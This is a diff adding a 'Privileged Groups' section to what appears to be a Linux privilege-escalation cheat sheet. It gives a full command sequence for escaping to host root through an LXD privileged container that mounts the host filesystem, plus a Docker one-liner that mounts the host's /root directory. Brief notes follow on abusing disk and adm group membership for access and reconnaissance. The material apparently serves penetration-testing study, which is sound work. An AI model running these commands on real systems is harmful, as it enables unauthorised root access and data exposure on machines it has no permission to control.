@@ -288,4 +288,38 @@ Again, check [GTFOBins](https://gtfobins.github.io)
 
 ### Priviliged Groups
 
+LXC/LXD
+All users added to LXD group at install.
+Usage = Create LXD container, make it privileged, and then access host file system at /mnt/root
+Process:
+```bash
+id #Verify you are in the (lxd) group
+
+unzip alpine.zip #Unzip alpine image
+
+lxd init #Accept all defaults
+
+lxc image import alipine.tar.gz alpine.tar.gz.root --alias alpine #Import the local image
+
+lxc init alpine r00t -c security.privileged=true #Start privileged container make container root the same as host root.
+
+lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true #Mount the host file system
+
+lxc start r00t
+
+lxc exec r00t /bin/sh #Spawn a shell inside the container
+```
+
+
+Docker
+```bash
+docker run -v /root:/mnt -it ubuntu #Creates a new docker instance with /root on the host mounted as a volume at /mnt
+```
+
+Disk
+Members of the (Disk) group have access to any devices within /dev, including /dev/sda1 (usually the main OS drive)
+
+ADM
+Members of the (ADM) group have access to all logs in /var/log. Not directly root, but good recon!
+
 
